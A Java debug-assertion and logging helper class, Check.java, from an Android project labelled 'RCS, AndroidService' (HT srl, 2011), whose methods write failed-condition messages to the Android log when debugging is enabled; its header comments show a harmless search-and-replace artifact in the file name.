/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : if(Cfg.DEBUG) Check.java 
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.lfish.control.action.actiontool;


import android.util.Log;

/**
 * The Class if(Cfg.DEBUG) Check.
 */
public final class Check {
	private static final String RCSA_TAG="RCSA";
	private static final String TAG = "Check"; 
	private static boolean enabled = Cfg.DEBUG;
	private static boolean error;

	/**
	 * Asserts, used to verify the truth of an expression
	 * 
	 * @param b
	 *            the b
	 * @param string
	 *            the string
	 */
	public static void asserts(final boolean b, final String string) {
		if (enabled && b != true) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "##### Asserts - " + string + " #####"); //$NON-NLS-2$
			}
		}
	}

	/**
	 * Requires. Used to Check.prerequisites of a method. 
	 * 
	 * @param b
	 *            the b
	 * @param string
	 *            the string
	 */
	public static void requires(final boolean b, final String string) {
		if (enabled && b != true) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "##### Requires - " + string + " #####"); //$NON-NLS-2$
			}
		}
	}

	/**
	 * Ensures. Check. to be done at the end of a method. 
	 * 
	 * @param b
	 *            the b
	 * @param string
	 *            the string
	 */
	public static void ensures(final boolean b, final String string) {
		if (enabled && b != true) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "##### Ensures - " + string + " #####"); //$NON-NLS-2$
			}
		}
	}

	public static void log(String string) {
		//log(string, false);
		Log.d(RCSA_TAG, string);
	}

//	public synchronized static void log(String string, boolean forced) {
//		if (Cfg.DEBUG || forced || Cfg.DEBUGKEYS || Cfg.DEBUG_SPECIFIC) {
//			Log.d("QZ", string); 
//
//			if (Cfg.FILE) {
//				final AutoFile file = new AutoFile(Path.getCurLogfile());
//				final DateTime date = new DateTime();
//				try{
//					file.append(date.getOrderedString() + " - " + string + "\n");  //$NON-NLS-2$
//				}catch(Exception ex){
//					Cfg.FILE = false;
//				}
//
//			}
//		}
//	}

	public static void log(Throwable e) {
		if (Cfg.DEBUG || Cfg.EXCEPTION) {
			e.printStackTrace();
			log("Exception: " + e.toString(), true); 
		}
	}

	public static void log(String format, Object... args) {
		log(String.format(format, args));
	}

	public static void log(String string, Exception ex) {
		if (Cfg.DEBUG || Cfg.EXCEPTION) {
			ex.printStackTrace();
			log(string + ex.toString(), true); 
		}
		
	}
}
